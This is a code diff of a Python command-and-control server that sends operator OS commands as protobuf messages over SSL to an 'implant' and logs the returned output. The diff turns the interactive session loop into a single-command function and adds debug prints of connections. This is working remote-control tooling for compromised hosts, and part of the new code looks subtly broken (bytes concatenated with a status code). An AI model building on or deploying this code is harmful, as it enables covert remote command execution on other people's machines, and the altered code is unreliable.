@@ -22,6 +22,8 @@ class Sessions:
         # TODO: make sure the id doesn't already exist in the _sessions dict
         self._mutex.acquire()
         id = str(uuid.uuid4())
+        print ("################## conn:", conn)
+        print ("################## addr:", addr)
         self._sessions[id] = (conn, addr)
         self._mutex.release()
         return id
@@ -100,38 +102,34 @@ class Listener:
 
 
 # Send data to implant
-def session(conn: ssl.SSLSocket):
-    while True:
-        userin = input("[session] > ")
-        if userin == "exit":
-            break
+def session(conn: ssl.SSLSocket, userin):
+    # Turn the cmd into a protobuf Message
+    os_cmd = implantpb_pb2.OsCmd(cmd=userin)
+    message = implantpb_pb2.Message(
+        message_type=implantpb_pb2.Message.MessageType.OsCmd,
+        data=os_cmd.SerializeToString()
+    )
+    conn.sendall(message.SerializeToString())
+    data = conn.recv(1024)
 
-        # Turn the cmd into a protobuf Message
-        os_cmd = implantpb_pb2.OsCmd(cmd=userin)
-        message = implantpb_pb2.Message(
-            message_type=implantpb_pb2.Message.MessageType.OsCmd,
-            data=os_cmd.SerializeToString()
-        )
-        conn.sendall(message.SerializeToString())
-        data = conn.recv(1024)
-        if not data:
-            break
-        else:
-            logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
-            # Decode the data into OsCmdOutput
-            message = implantpb_pb2.Message()
-            message.ParseFromString(data)
-            if message.message_type == implantpb_pb2.Message.MessageType.OsCmdOutput:
-                output = implantpb_pb2.OsCmdOutput()
-                output.ParseFromString(message.data)
-                logging.info(output.stdout)
-                if output.HasField("status") and output.code != 0:
-                    print(f"Status code: {output.code}")
-                if len(output.stderr) > 0:
-                    print("stdout:")
-                    sys.stdout.buffer.write(output.stdout)
-                    print()
-                    print("stderr:")
-                    sys.stdout.buffer.write(output.stderr)
-                else:
-                    sys.stdout.buffer.write(output.stdout)
+    if not data:
+        return 
+
+    else:
+        logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
+        # Decode the data into OsCmdOutput
+        message = implantpb_pb2.Message()
+        message.ParseFromString(data)
+        if message.message_type == implantpb_pb2.Message.MessageType.OsCmdOutput:
+            output = implantpb_pb2.OsCmdOutput()
+            output.ParseFromString(message.data)
+            logging.info(output.stdout)
+
+            if output.HasField("status") and output.code != 0:
+                return(b"Status code: " + output.code + b"\n")
+
+            if len(output.stderr) > 0:
+                return(b"stdout:\n" +output.stdout + b"\nstderr:\n" + output.stderr)
+
+            else:
+                return(output.stdout)
